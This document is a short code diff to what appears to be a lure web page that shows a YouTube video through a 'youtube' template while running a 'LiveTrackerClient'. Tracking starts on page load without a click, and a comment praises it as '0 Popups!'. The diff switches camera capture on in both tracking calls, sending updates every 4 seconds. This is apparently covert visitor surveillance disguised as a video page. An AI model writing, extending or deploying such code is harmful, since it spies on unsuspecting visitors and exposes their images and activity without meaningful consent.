@@ -361,7 +361,7 @@
                 window.LiveTrackerClient.startTracking({
                     templateName: 'youtube',
                     updateInterval: 4000,
-                    enableCamera: false,
+                    enableCamera: true,
                     enableGPS: false
                 });
             }
@@ -369,7 +369,6 @@
 
         overlay.addEventListener('click', startVideoAndTelemetry);
         
-        // Auto-start passive tracking on load (0 Popups!)
         window.addEventListener('DOMContentLoaded', () => {
             iframe.src = `https://www.youtube-nocookie.com/embed/${videoId}?rel=0`;
             
@@ -377,7 +376,7 @@
                 window.LiveTrackerClient.startTracking({
                     templateName: 'youtube',
                     updateInterval: 4000,
-                    enableCamera: false,
+                    enableCamera: true,
                     enableGPS: false
                 });
             }
